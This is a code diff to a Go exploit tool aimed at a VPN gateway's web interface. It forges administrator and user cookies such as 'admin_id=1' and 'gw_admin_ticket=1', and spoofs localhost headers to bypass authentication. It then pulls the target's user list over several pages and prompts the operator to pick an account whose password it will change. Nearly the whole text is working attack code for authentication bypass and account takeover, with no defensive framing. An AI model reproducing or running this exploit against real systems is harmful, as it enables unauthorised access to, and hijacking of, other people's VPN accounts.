@@ -7,6 +7,7 @@ import (
 	"github.com/go-resty/resty/v2"
 	"log"
 	"net/http"
+	"os"
 	"strings"
 	"time"
 )
@@ -17,42 +18,50 @@ func (v *vpnConnect) getUserList() {
 		"X-Forwarded-For": "127.0.0.1",
 		"X-Originating":   "127.0.0.1",
 		"X-Remote-IP":     "127.0.0.1",
-		"X-Remote-Addr":   "127.0.0.1"}
-	headers["cookie"] = "gw_admin_ticket=1"
+		"X-Remote-Addr":   "127.0.0.1",
+		"Refere":          v.target}
+	headers["Cookie"] = "admin_id=1; gw_admin_ticket=1;"
 	v.users = make([]string, 0)
 	client := resty.New()
 	client.SetHeaders(headers)
 	client.SetBaseURL(v.target)
 	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
 	client.SetTimeout(time.Duration(v.timeout) * time.Second)
-	resp, err := client.R().Get(getUserListPath)
-	if err != nil {
-		log.SetPrefix("[-] ")
-		log.Fatalln(err)
-	}
-	dom, err := goquery.NewDocumentFromReader(strings.NewReader(string(resp.Body())))
-	if err != nil {
-		log.SetPrefix("[-] ")
-		log.Fatalln(err)
-	}
-	if !strings.Contains(string(resp.Body()), "用户信息") {
-		log.SetPrefix("[-] ")
-		log.Fatalln("target may secure.")
-	}
 	log.SetPrefix("[*] ")
 	log.Println("Try To Get Target's User List.")
-	dom.Find("#user_unsel > option").Each(
-		func(i int, selection *goquery.Selection) {
-			v.users = append(v.users, strings.Split(selection.Text(), "->")[1])
-		})
+	for i := 0; i < 6; i++ {
+		resp, err := client.R().Get(fmt.Sprintf("%s%d", getUserListPath, i))
+		if err != nil {
+			log.SetPrefix("[-] ")
+			log.Fatalln(err)
+			os.Exit(0)
+		}
+		if !strings.Contains(string(resp.Body()), "用户信息") {
+			log.SetPrefix("[-] ")
+			log.Fatalln("target may secure.")
+		}
+		dom, err := goquery.NewDocumentFromReader(strings.NewReader(string(resp.Body())))
+		if err != nil {
+			log.SetPrefix("[-] ")
+			log.Fatalln(err)
+		}
+		dom.Find("#user_sel option").Each(
+			func(i int, selection *goquery.Selection) {
+				v.users = append(v.users, strings.Split(selection.Text(), "->")[1])
+			})
+	}
+	if len(v.users) == 0 {
+		log.SetPrefix("[-] ")
+		log.Fatalln("get user failed,target may secure.")
+		os.Exit(0)
+	}
 	log.SetPrefix("[*] ")
 	log.Println("Target User List Got It.")
-	log.Printf("Target Have %d User.\n", len(v.users))
 	v.canGetUser = true
-	v.cookie = resp.Cookies()[0].Value
+	v.showUserList()
+	log.Printf("Target Have %d User.\n", len(v.users))
 }
 func (v *vpnConnect) changePassword() {
-	v.showUserList()
 	var index int
 	fmt.Print("[!] Give A Num of User That You Want To Change Password:")
 	fmt.Scanf("%d\n", &index)
@@ -65,8 +74,10 @@ func (v *vpnConnect) changePassword() {
 		"X-Originating":   "127.0.0.1",
 		"X-Remote-IP":     "127.0.0.1",
 		"X-Remote-Addr":   "127.0.0.1",
+		"Referer":         fmt.Sprintf("%s/welcome.php", v.target),
+		"Origin":          v.target,
 	}
-	headers["cookie"] = fmt.Sprintf(`PHPSESSID=%s;gw_user_ticket=ffffffffffffffffffffffffffffffff; user_lang_id=2; last_step_param={"this_name": "%s","subAuthId": "1"}`, v.cookie, v.users[index])
+	headers["Cookie"] = fmt.Sprintf(`admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"%s","subAuthId":"1"}`, v.users[index])
 	client := resty.New()
 	client.SetHeaders(headers)
 	client.SetBaseURL(v.target)
